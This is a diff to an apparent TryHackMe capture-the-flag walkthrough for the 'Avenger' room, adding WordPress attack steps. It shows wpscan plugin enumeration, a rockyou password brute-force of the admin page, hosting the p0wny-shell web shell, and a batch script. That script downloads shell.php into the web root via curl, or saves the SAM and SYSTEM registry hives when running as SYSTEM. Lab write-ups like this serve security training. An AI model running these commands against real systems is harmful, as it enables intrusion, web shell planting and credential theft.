@@ -92,12 +92,56 @@ ffuf -u http://avenger.tryhackme/gift/FUZZ -w /usr/share/wordlists/SecLists/Disc
 **Kali**
 
 ```
-wpscan --url http://avenger.tryhackme/wordpress
+ wpscan --url http://avenger.tryhackme/gift --enumerate p
 ```
 
-<figure><img src="../../.gitbook/assets/image (985).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (987).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (986).png" alt=""><figcaption></figcaption></figure>
+**Bruteforce admin page**
+
+**Kali**
+
+```
+wpscan --url http://avenger.tryhackme/gift --passwords /usr/share/wordlists/rockyou.txt
+```
+
+
+
+<figure><img src="../../.gitbook/assets/image (988).png" alt=""><figcaption></figcaption></figure>
+
+
+
+**Kali**
+
+```
+git clone https://github.com/flozz/p0wny-shell.git
+cd p0wny-shell/ 
+
+python2 -m SimpleHTTPServer 82
+```
+
+**exploit.bat**
+
+<pre><code><strong>@echo off
+</strong>
+:: Check if the current user is NT AUTHORITY\SYSTEM
+whoami /groups | find "S-1-5-18" > nul
+
+if %errorlevel% equ 0 (
+    :: Run commands for NT AUTHORITY\SYSTEM
+    reg.exe save HKLM\SYSTEM C:\xampp\htdocs\system.bak
+    reg.exe save HKLM\SAM C:\xampp\htdocs\sam.bak
+) else (
+    :: Run commands for other users
+    curl http://$VICTIM:82/shell.php -o C:\xampp\htdocs\shell.php
+)
+</code></pre>
+
+
+
+<figure><img src="../../.gitbook/assets/image (989).png" alt=""><figcaption></figcaption></figure>
+
+
 
 **Kali**
 
@@ -107,7 +151,7 @@ f
 
 
 
-[http://avenger.tryhackme/gift/wp-content/plugins/forminator/](http://avenger.tryhackme/gift/wp-content/plugins/forminator/)
+
 
 
 
